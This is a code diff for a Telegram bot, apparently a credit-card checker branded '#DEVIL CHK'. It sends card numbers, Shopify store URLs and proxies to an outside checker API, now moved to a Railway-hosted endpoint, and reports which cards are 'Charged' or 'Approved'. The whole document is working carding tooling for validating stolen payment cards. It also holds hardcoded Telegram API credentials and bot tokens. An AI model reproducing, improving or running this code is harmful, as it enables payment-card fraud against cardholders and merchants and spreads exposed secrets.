@@ -8,11 +8,11 @@ import time
 import json
 import re
 from datetime import datetime
-# Direct API endpoint (replaces checker_bridge)
-CHECKER_API_URL = 'http://62.72.20.10:8081/'
+
+# 🔥 Direct API endpoint updated to the best Railway URL with Proxy support
+CHECKER_API_URL = 'https://afuona.up.railway.app/shopify'
 
 # Premium Custom Emoji IDs (bot must be created with Telegram Premium account)
-# Use @RawDataBot to get custom_emoji_id for any premium emoji
 PREMIUM_EMOJI_IDS = {
     "✅": "6023660820544623088",   # ✨ Multi Sparkles / Celebration
     "🔥": "5999340396432333728",   # 🔥 Purple Flame Heart
@@ -47,8 +47,7 @@ def premium_emoji(text):
 # Bot Configuration
 API_ID = 39825025
 API_HASH = '47170fd9a11b3f591bbc56849519f0f8'
-BOT_TOKEN = '8827673793:AAFOdEg6mYpaeyo-ROnumwxRAPMZPVWg91k'
-
+BOT_TOKEN = '7412552338:AAF_Xf2hy0lJ5hQQ_oP04BA7XzE8o30wAi4'
 
 # File paths
 PREMIUM_FILE = 'premium.txt'
@@ -82,7 +81,7 @@ _DEAD_INDICATORS = (
     'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
     'all products sold out', 'no_session_token', 'tokenize_fail',
 )
-# --- UPDATED LOADING FUNCTIONS ---
+
 def get_file_lines(filepath):
     """Helper to read lines from a file fresh every time"""
     if not os.path.exists(filepath):
@@ -158,12 +157,14 @@ async def check_card(card, site, proxy):
         if len(parts) != 4:
             return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
 
+        # Updated to use 'site' instead of 'url' and include the proxy parameter
         params = {
             'cc': card,
-            'url': site,
+            'site': site,
             'proxy': proxy
         }
-        timeout = aiohttp.ClientTimeout(total=120)
+        # Timeout reduced to 45 seconds for optimal performance on Railway
+        timeout = aiohttp.ClientTimeout(total=45)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(CHECKER_API_URL, params=params) as resp:
                 raw = await resp.json(content_type=None)
@@ -221,7 +222,7 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2):
 
         last_result = result
         if attempt < max_retries - 1:
-            await asyncio.sleep(0.3)  # Reduced from 0.5
+            await asyncio.sleep(0.3)
 
     if last_result:
         return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}
@@ -251,8 +252,6 @@ async def send_realtime_hit(user_id, result, hit_type, username):
         await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
     except:
         pass
-
-
 
 async def update_progress(user_id, message_id, results, current_attempt_count):
     """Update progress message with new design"""
@@ -289,7 +288,6 @@ async def send_final_results(user_id, results):
     minutes = (elapsed % 3600) // 60
     seconds = elapsed % 60
 
-    # Build hits text
     hits_text = ""
     if results['charged']:
         for r in results['charged'][:5]:
@@ -302,8 +300,6 @@ async def send_final_results(user_id, results):
         hits_text = "No hits found"
 
     gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
-
-    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
     summary = f"""<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈𝐋 𝐂𝐇𝐊  💳⚡</b>
 <b>━━━━━━━━━━━━━━━━━</b>
@@ -355,13 +351,13 @@ async def test_site(site, proxy):
     """Test a single site using the direct checker API with a test card"""
     test_card = "5154623245618097|03|2032|156"
     try:
-        params = {'cc': test_card, 'url': site, 'proxy': proxy}
-        timeout = aiohttp.ClientTimeout(total=60)
+        params = {'cc': test_card, 'site': site, 'proxy': proxy}
+        timeout = aiohttp.ClientTimeout(total=40)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(CHECKER_API_URL, params=params) as resp:
                 raw = await resp.json(content_type=None)
         response_msg = raw.get('Response', '').lower()
-        if is_dead_site_error(response_msg):
+        if 'site dead' in response_msg or 'invalid site' in response_msg:
             return {'site': site, 'status': 'dead'}
         return {'site': site, 'status': 'alive'}
     except:
@@ -372,18 +368,18 @@ async def test_proxy(proxy):
     test_card = "5154623245618097|03|2032|156"
     test_site_url = "https://riverbendhomedev.myshopify.com"
     try:
-        params = {'cc': test_card, 'url': test_site_url, 'proxy': proxy}
-        timeout = aiohttp.ClientTimeout(total=60)
+        params = {'cc': test_card, 'site': test_site_url, 'proxy': proxy}
+        timeout = aiohttp.ClientTimeout(total=40)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(CHECKER_API_URL, params=params) as resp:
                 raw = await resp.json(content_type=None)
         response_msg = raw.get('Response', '').lower()
-        if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg or 'no proxy' in response_msg:
+        if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg:
             return {'proxy': proxy, 'status': 'dead'}
-        else:
-            return {'proxy': proxy, 'status': 'alive'}
+        return {'proxy': proxy, 'status': 'alive'}
     except:
         return {'proxy': proxy, 'status': 'dead'}
+
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
     await event.reply(
@@ -418,10 +414,8 @@ async def single_cc_check(event):
     try:
         sender = await event.get_sender()
         username = sender.username if sender.username else f"user_{user_id}"
-        first_name = sender.first_name if sender.first_name else "User"
     except:
         username = f"user_{user_id}"
-        first_name = "User"
 
     if not is_premium(user_id):
         await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this bot."), parse_mode='html')
@@ -445,7 +439,6 @@ async def single_cc_check(event):
         return
 
     card = cards[0]
-    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
     status_msg = await event.reply(
         premium_emoji(
@@ -460,8 +453,6 @@ async def single_cc_check(event):
 
     try:
         result = await check_card_with_retry(card, sites, proxies, max_retries=3)
-
-        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
 
         if result['status'] == 'Charged':
             status_emoji = "✅"
@@ -604,7 +595,6 @@ async def clear_all_proxies(event):
         await event.reply(premium_emoji("❌ <code>proxy.txt</code> is already empty."), parse_mode='html')
         return
 
-    # Send backup file to user
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"
 
@@ -622,7 +612,6 @@ async def clear_all_proxies(event):
             parse_mode='html'
         )
 
-        # Remove backup file after sending
         try:
             os.remove(backup_filename)
         except:
@@ -632,7 +621,6 @@ async def clear_all_proxies(event):
         await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
         return
 
-    # Clear proxy.txt
     async with aiofiles.open(PROXY_FILE, 'w') as f:
         await f.write("")
 
@@ -851,7 +839,6 @@ async def check_command(event):
                     
                 queue.task_done()
                 
-                # Real-time exact-completion update throttle (1.0 sec)
                 now = time.time()
                 if now - last_update_time[0] >= 1.0:
                     last_update_time[0] = now
@@ -945,7 +932,7 @@ async def proxy_command(event):
     except Exception as e:
         await status_msg.edit(premium_emoji(f"❌ An error occurred during proxy check: {e}"))
 
-@bot.on(events.NewMessage(pattern='/site'))
+@bot.on(events.NewMessage(pattern='/fuck'))
 async def site_command(event):
     """Check all sites and remove dead ones"""
     user_id = event.sender_id
